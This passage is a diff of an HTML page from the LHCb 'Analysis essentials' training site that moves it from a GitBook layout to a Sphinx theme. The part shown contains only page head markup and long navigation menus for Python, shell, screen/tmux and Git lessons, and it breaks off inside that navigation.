@@ -1,847 +1,588 @@
 
-<!DOCTYPE HTML>
-<html lang="" >
-    <head>
-        <meta charset="UTF-8">
-        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>Advanced shell topics · LHCb analysis essentials</title>
-        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-        <meta name="description" content="">
-        <meta name="generator" content="GitBook 3.2.3">
-        
-        
-        
-    
-    <link rel="stylesheet" href="../gitbook/style.css">
 
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>More about the UNIX shell &mdash; Analysis essentials  documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+  <script type="text/javascript" src="../_static/js/modernizr.min.js"></script>
+  
     
-            
-                
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-katex/katex.min.css">
-                
-            
-                
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-panels/panels.css">
-                
-            
-                
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-block-align/plugin.css">
-                
-            
-                
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
-                
-            
-                
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
-                
-            
-                
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
-                
-            
-        
+      <script type="text/javascript" id="documentation_options" data-url_root="../" src="../_static/documentation_options.js"></script>
+        <script type="text/javascript" src="../_static/jquery.js"></script>
+        <script type="text/javascript" src="../_static/underscore.js"></script>
+        <script type="text/javascript" src="../_static/doctools.js"></script>
+        <script type="text/javascript" src="../_static/language_data.js"></script>
+        <script type="text/javascript" src="../_static/panels.js"></script>
+        <script crossorigin="anonymous" integrity="sha256-Ae2Vz/4ePdIu6ZyI/5ZGsYnb+m0JlOmKPjt6XZ9JJkA=" type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.4/require.min.js"></script>
+        <script async="async" type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+        <script type="text/x-mathjax-config">MathJax.Hub.Config({"tex2jax": {"inlineMath": [["$", "$"], ["\\(", "\\)"]], "processEscapes": true, "ignoreClass": "document", "processClass": "math|output_area"}})</script>
+    
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
 
     
 
-    
-        
-        <link rel="stylesheet" href="../css/website.css">
-        
-    
+  
+  <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="../_static/panels.css" type="text/css" />
+  <link rel="stylesheet" href="../_static/hsf.css" type="text/css" />
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" />
+    <link rel="next" title="Git" href="../git/README.html" />
+    <link rel="prev" title="Persistent screen or tmux session on lxplus" href="persistent-screen.html" /> 
+</head>
 
-        
-    
-    
-    <meta name="HandheldFriendly" content="true"/>
-    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
-    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
-    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+<body class="wy-body-for-nav">
 
+   
+  <div class="wy-grid-for-nav">
     
-    <link rel="next" href="../git/" />
-    
-    
-    <link rel="prev" href="persistent-screen.html" />
-    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+          
 
-    </head>
-    <body>
-        
-<div class="book">
-    <div class="book-summary">
-        
+          
+            <a href="../index.html" class="icon icon-home"> Analysis essentials
+          
+
+          
             
-<div id="book-search-input" role="search">
-    <input type="text" placeholder="Type to search" />
+            <img src="../_static/hsf_logo_angled.png" class="logo" alt="Logo"/>
+          
+          </a>
+
+          
+            
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
 </div>
 
-            
-                <nav role="navigation">
-                
+          
+        </div>
 
-
-<ul class="summary">
-    
-    
-
-    
-
-    
-        
-        
-    
-        <li class="chapter " data-level="1.1" data-path="../">
-            
-                <a href="../">
-            
-                    
-                    Introduction
-            
-                </a>
-            
-
-            
-        </li>
-    
-
-    
-        
-        <li class="divider"></li>
-        
-        
-    
-        <li class="chapter " data-level="2.1" data-path="../python/">
-            
-                <a href="../python/">
-            
-                    
-                    Python
-            
-                </a>
-            
-
-            
-            <ul class="articles">
-                
-    
-        <li class="chapter " data-level="2.1.1" data-path="../python/running.html">
-            
-                <a href="../python/running.html">
-            
-                    
-                    Running
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="2.1.2" data-path="../python/operators.html">
-            
-                <a href="../python/operators.html">
-            
-                    
-                    Objects and operators
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="2.1.3" data-path="../python/numbers.html">
-            
-                <a href="../python/numbers.html">
-            
-                    
-                    Numbers
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="2.1.4" data-path="../python/strings.html">
-            
-                <a href="../python/strings.html">
-            
-                    
-                    Strings
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="2.1.5" data-path="../python/lists.html">
-            
-                <a href="../python/lists.html">
-            
-                    
-                    Lists and looping
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="2.1.6" data-path="../python/dictionaries.html">
-            
-                <a href="../python/dictionaries.html">
-            
-                    
-                    Dictionaries
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="2.1.7" data-path="../python/conditions.html">
-            
-                <a href="../python/conditions.html">
-            
-                    
-                    Conditions
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="2.1.8" data-path="../python/methods.html">
-            
-                <a href="../python/methods.html">
-            
-                    
-                    Methods
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="2.1.9" data-path="../python/scripting.html">
-            
-                <a href="../python/scripting.html">
-            
-                    
-                    Scripting
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="2.1.10" data-path="../python/modules.html">
-            
-                <a href="../python/modules.html">
-            
-                    
-                    Modules
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="2.1.11" data-path="../python/learning.html">
-            
-                <a href="../python/learning.html">
-            
-                    
-                    Learning more
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="2.1.12" data-path="../python/first_histogram.html">
-            
-                <a href="../python/first_histogram.html">
-            
-                    
-                    Making your first histogram
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="2.1.13" data-path="../python/further_reading.html">
-            
-                <a href="../python/further_reading.html">
-            
-                    
-                    Further reading
-            
-                </a>
-            
-
-            
-        </li>
-    
-
-            </ul>
-            
-        </li>
-    
-
-    
-        
-        <li class="divider"></li>
-        
-        
-    
-        <li class="chapter " data-level="3.1" data-path="../shell/">
-            
-                <a href="../shell/">
-            
-                    
-                    Introducing the Shell
-            
-                </a>
-            
-
-            
-            <ul class="articles">
-                
-    
-        <li class="chapter " data-level="3.1.1" data-path="../shell/02-filedir.html">
-            
-                <a href="../shell/02-filedir.html">
-            
-                    
-                    Navigating Files and Directories
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="3.1.2" data-path="../shell/03-create.html">
-            
-                <a href="../shell/03-create.html">
-            
-                    
-                    Working With Files and Directories
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="3.1.3" data-path="../shell/04-pipefilter.html">
-            
-                <a href="../shell/04-pipefilter.html">
-            
-                    
-                    Pipes and Filters
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="3.1.4" data-path="../shell/05-loop.html">
-            
-                <a href="../shell/05-loop.html">
-            
-                    
-                    Loops
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="3.1.5" data-path="../shell/06-script.html">
-            
-                <a href="../shell/06-script.html">
-            
-                    
-                    Shell Scripts
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="3.1.6" data-path="../shell/07-find.html">
-            
-                <a href="../shell/07-find.html">
-            
-                    
-                    Finding Things
-            
-                </a>
-            
-
-            
-        </li>
-    
-
-            </ul>
-            
-        </li>
-    
-
-    
-        
-        <li class="divider"></li>
-        
-        
-    
-        <li class="chapter " data-level="4.1" data-path="./">
-            
-                <a href="./">
-            
-                    
-                    Shell extras
-            
-                </a>
-            
-
-            
-            <ul class="articles">
-                
-    
-        <li class="chapter " data-level="4.1.1" data-path="screen.html">
-            
-                <a href="screen.html">
-            
-                    
-                    Using screen to keep things running
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="4.1.2" data-path="screen2.html">
-            
-                <a href="screen2.html">
-            
-                    
-                    Advanced screen topics
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="4.1.3" data-path="persistent-screen.html">
-            
-                <a href="persistent-screen.html">
-            
-                    
-                    Persistent screen or tmux session
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter active" data-level="4.1.4" data-path="shell2.html">
-            
-                <a href="shell2.html">
-            
-                    
-                    Advanced shell topics
-            
-                </a>
-            
-
-            
-        </li>
-    
-
-            </ul>
-            
-        </li>
-    
-
-    
-        
-        <li class="divider"></li>
-        
-        
-    
-        <li class="chapter " data-level="5.1" data-path="../git/">
-            
-                <a href="../git/">
-            
-                    
-                    Version control with Git
-            
-                </a>
-            
-
-            
-            <ul class="articles">
-                
-    
-        <li class="chapter " data-level="5.1.1" data-path="../git/01-basics.html">
-            
-                <a href="../git/01-basics.html">
-            
-                    
-                    Basics
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="5.1.2" data-path="../git/02-setup.html">
-            
-                <a href="../git/02-setup.html">
-            
-                    
-                    Setting Up Git
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="5.1.3" data-path="../git/03-create.html">
-            
-                <a href="../git/03-create.html">
-            
-                    
-                    Creating a Repository
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="5.1.4" data-path="../git/04-changes.html">
-            
-                <a href="../git/04-changes.html">
-            
-                    
-                    Tracking Changes
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="5.1.5" data-path="../git/05-history.html">
-            
-                <a href="../git/05-history.html">
-            
-                    
-                    Exploring History
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="5.1.6" data-path="../git/06-ignore.html">
-            
-                <a href="../git/06-ignore.html">
-            
-                    
-                    Ignoring Things
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="5.1.7" data-path="../git/07-gitlab.html">
-            
-                <a href="../git/07-gitlab.html">
-            
-                    
-                    Remotes in CERN GitLab
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="5.1.8" data-path="../git/08-share.html">
-            
-                <a href="../git/08-share.html">
-            
-                    
-                    Sharing a repository with others
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="5.1.9" data-path="../git/09-pullrequests.html">
-            
-                <a href="../git/09-pullrequests.html">
-            
-                    
-                    Collaborating with Pull Requests
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="5.1.10" data-path="../git/10-conflict.html">
-            
-                <a href="../git/10-conflict.html">
-            
-                    
-                    Conflicts
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="5.1.11" data-path="../git/11-ci.html">
-            
-                <a href="../git/11-ci.html">
-            
-                    
-                    GitLab CI
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="5.1.12" data-path="../git/12-open.html">
-            
-                <a href="../git/12-open.html">
-            
-                    
-                    Open Science
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="5.1.13" data-path="../git/13-licensing.html">
-            
-                <a href="../git/13-licensing.html">
-            
-                    
-                    Licensing
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="5.1.14" data-path="../git/14-citation.html">
-            
-                <a href="../git/14-citation.html">
-            
-                    
-                    Citation
-            
-                </a>
-            
-
-            
-        </li>
-    
-
-            </ul>
-            
-        </li>
-    
-
-    
-        
-        <li class="divider"></li>
-        
-        
-    
-        <li class="chapter " data-level="6.1" >
-            
-                <a target="_blank" href="ref://analysis-essentials.pdf">
-            
-                    
-                    Download PDF
-            
-                </a>
-            
-
-            
-        </li>
-    
-
-    
-
-    <li class="divider"></li>
-
-    <li>
-        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
-            Published with GitBook
-        </a>
-    </li>
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../python/README.html">An introduction to Python</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="../python/README.html#aim-of-these-lessons">Aim of these lessons</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="../python/running.html">Running Python</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../python/operators.html">Objects and operators</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../python/operators.html#objects">Objects</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../python/numbers.html">Numbers</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../python/strings.html">Strings</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../python/strings.html#formatting">Formatting</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../python/lists.html">Lists and looping</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../python/lists.html#looping">Looping</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../python/lists.html#list-comprehension">List comprehension</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../python/lists.html#tuples">Tuples</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../python/dictionaries.html">Dictionaries</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../python/dictionaries.html#dictionary-keys">Dictionary keys</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../python/conditions.html">Conditions</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../python/conditions.html#truthiness">Truthiness</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../python/conditions.html#conditions-in-loops">Conditions in loops</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../python/methods.html">Methods</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../python/methods.html#inline-methods">Inline methods</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../python/scripting.html">Scripting</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../python/scripting.html#argparse">argparse</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../python/modules.html">Modules</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../python/modules.html#using-modules-into-your-code-import">Using modules into your code: import</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../python/modules.html#the-standard-library">The standard library</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../python/modules.html#modules-from-pypi">Modules from PyPi</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../python/modules.html#modules-inside-a-virtual-environment">Modules inside a virtual environment</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../python/modules.html#write-your-first-python-module">Write your first Python module</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../python/modules.html#write-a-structured-module">Write a structured module</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../python/modules.html#run-a-module">Run a module</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../python/learning.html">Learning more</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../python/learning.html#exploring-python">Exploring Python</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../python/learning.html#conventional-coding">Conventional coding</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../python/first_histogram.html">Making your first histogram</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../python/first_histogram.html#pandas">Pandas</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../python/first_histogram.html#plotting-histograms">Plotting histograms</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../python/first_histogram.html#applying-cuts">Applying cuts</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../python/further_reading.html">More advanced topics in Python</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../python/further_reading.html#nice-standard-libraries">Nice standard libraries</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../python/further_reading.html#nice-libraries-for-data-analysis">Nice libraries for data analysis</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../python/further_reading.html#python-and-root">Python and ROOT</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../advanced-python/README.html">Advanced Python Tutorial</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="../advanced-python/1Basics.html">1: Basics</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/1Basics.html#Basics">Basics</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/1Basics.html#Markdown">Markdown</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/1Basics.html#Jupyter">Jupyter</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/1Basics.html#Importing-modules">Importing modules</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../advanced-python/2DataAndPlotting.html">2: First look at data</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/2DataAndPlotting.html#Recap:-Importing-modules">Recap: Importing modules</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../advanced-python/2DataAndPlotting.html#5.-The-toy-dataset">5. The toy dataset</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/2DataAndPlotting.html#Loading-data">Loading data</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../advanced-python/2DataAndPlotting.html#6.-Plotting-a-histogram-with-matplotlib">6. Plotting a histogram with <code class="docutils literal notranslate"><span class="pre">matplotlib</span></code></a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/2DataAndPlotting.html#Adding-variables">Adding variables</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../advanced-python/2DataAndPlotting.html#Using-rectangular-cuts">Using rectangular cuts</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/2DataAndPlotting.html#Comparing-distributions">Comparing distributions</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../advanced-python/3Classification.html">3: Multivariate Analysis</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/3Classification.html#Using-a-classifier">Using a classifier</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../advanced-python/3Classification.html#TODO-Add-a-diagram-of-a-decision-tree-for-the-above-plot">TODO Add a diagram of a decision tree for the above plot</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../advanced-python/4Extension.html">4: Extension</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/4Extension.html#Alternative-implimentations">Alternative implimentations</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/4Extension.html#Feature-engineering">Feature engineering</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/4Extension.html#k-folding"><span class="math notranslate nohighlight">\(k\)</span>-folding</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/4Extension.html#Turn-this-into-a-scipt-using-argparse">Turn this into a scipt using argparse</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../advanced-python/5BoostingToUniformity.html">5: Boosting to Uniformity</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/5BoostingToUniformity.html#Loading-data">Loading data</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../advanced-python/5BoostingToUniformity.html#Distributions-in-the-Dalitz-features-for-signal-and-background">Distributions in the Dalitz features for signal and background</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../advanced-python/5BoostingToUniformity.html#Preparation-of-train/test-datasets">Preparation of train/test datasets</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../advanced-python/5BoostingToUniformity.html#Setting-up-classifiers,-training">Setting up classifiers, training</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../advanced-python/5BoostingToUniformity.html#Let’s-look-at-the-results-of-training">Let’s look at the results of training</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../advanced-python/5BoostingToUniformity.html#ROC-curves-after-training">ROC curves after training</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../advanced-python/6DemoNeuralNetworks.html">6: Neural networks</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/6DemoNeuralNetworks.html#Downloading-a-dataset">Downloading a dataset</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/6DemoNeuralNetworks.html#Example-of-training-a-network">Example of training a network</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/6DemoNeuralNetworks.html#Creating-your-own-neural-network">Creating your own neural network</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/6DemoNeuralNetworks.html#Example-of-a-very-specific-neural-network">Example of a very specific neural network</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/6DemoNeuralNetworks.html#Fitting-very-specific-expressions-as-estimators">Fitting very specific expressions as estimators</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../advanced-python/6DemoNeuralNetworks.html#Writing-custom-pretransformer">Writing custom pretransformer</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/6DemoNeuralNetworks.html#Ensembling-of-neural-neworks">Ensembling of neural neworks</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../advanced-python/7DemoReweighting.html">7: Demonstration of distribution reweighting</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/7DemoReweighting.html#Downloading-data">Downloading data</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/7DemoReweighting.html#prepare-train-and-test-samples">prepare train and test samples</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../advanced-python/7DemoReweighting.html#Original-distributions">Original distributions</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/7DemoReweighting.html#train-part-of-original-distribution">train part of original distribution</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/7DemoReweighting.html#test-part-for-target-distribution">test part for target distribution</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/7DemoReweighting.html#Bins-based-reweighting-in-n-dimensions">Bins-based reweighting in n dimensions</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/7DemoReweighting.html#Gradient-Boosted-Reweighter">Gradient Boosted Reweighter</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../advanced-python/7DemoReweighting.html#Comparing-some-simple-expressions:">Comparing some simple expressions:</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/7DemoReweighting.html#GB-discrimination">GB-discrimination</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/7DemoReweighting.html#Folding-reweighter">Folding reweighter</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/7DemoReweighting.html#GB-discrimination-for-reweighting-rule">GB discrimination for reweighting rule</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../advanced-python/8sPlot.html">8: sPlot</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/8sPlot.html#Simple-sPlot-example">Simple sPlot example</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/8sPlot.html#Observed-distributions">Observed distributions</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/8sPlot.html#Applying-sWeights">Applying sWeights</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../advanced-python/8sPlot.html#Compare">Compare</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/8sPlot.html#More-complex-case">More complex case</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/8sPlot.html#Building-sPlot-over-mass">Building sPlot over mass</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../advanced-python/8sPlot.html#Of-course-we-don’t-have-labels-which-events-are-signal-and-which-are-background-beforehand">Of course we don’t have labels which events are signal and which are background beforehand</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../advanced-python/8sPlot.html#We-have-no-information-about-real-labels">We have no information about real labels</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/8sPlot.html#Fitting-doesn’t-give-us-information-about-real-labels">Fitting doesn’t give us information about real labels</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/8sPlot.html#Appying-sPlot">Appying sPlot</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/8sPlot.html#Using-sWeights-to-reconstruct-initial-distribution">Using sWeights to reconstruct initial distribution</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/8sPlot.html#An-important-requirement-of-sPlot">An important requirement of sPlot</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/8sPlot.html#Derivation-of-sWeights-(optional)">Derivation of sWeights (optional)</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../advanced-python/8sPlot.html#Under-assumption-of-linearity:">Under assumption of linearity:</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../advanced-python/8sPlot.html#Minimization-of-variation">Minimization of variation</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../advanced-python/8sPlot.html#Uncorrelatedness">Uncorrelatedness</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../advanced-python/8sPlot.html#Conclusion">Conclusion</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../shell/README.html">Introducing the Shell</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="../shell/README.html#background">Background</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../shell/README.html#the-command-line-interface">The Command-Line Interface</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../shell/README.html#the-shell">The Shell</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../shell/README.html#why-bother">Why bother?</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../shell/README.html#nelle-s-pipeline-starting-point">Nelle’s Pipeline: Starting Point</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="../shell/02-filedir.html">Navigating Files and Directories</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../shell/02-filedir.html#nelle-s-pipeline-organizing-files">Nelle’s Pipeline: Organizing Files</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../shell/03-create.html">Working With Files and Directories</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../shell/04-pipefilter.html">Pipes and Filters</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="../shell/04-pipefilter.html#nelle-s-pipeline-checking-files">Nelle’s Pipeline: Checking Files</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../shell/05-loop.html">Loops</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../shell/06-script.html">Shell Scripts</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../shell/07-find.html">Finding Things</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 current"><a class="reference internal" href="README.html">UNIX shell</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="screen.html">Using screen to keep things running</a></li>
+<li class="toctree-l2"><a class="reference internal" href="screen2.html">Advanced screen topics</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="screen2.html#finding-lost-screens">Finding lost screens</a></li>
+<li class="toctree-l3"><a class="reference internal" href="screen2.html#using-tabs-in-screen">Using tabs in screen</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="persistent-screen.html">Persistent screen or tmux session on lxplus</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="persistent-screen.html#setting-up-password-less-kerberos-token">Setting up password-less kerberos token</a></li>
+<li class="toctree-l3"><a class="reference internal" href="persistent-screen.html#making-use-of-the-keytab">Making use of the keytab</a></li>
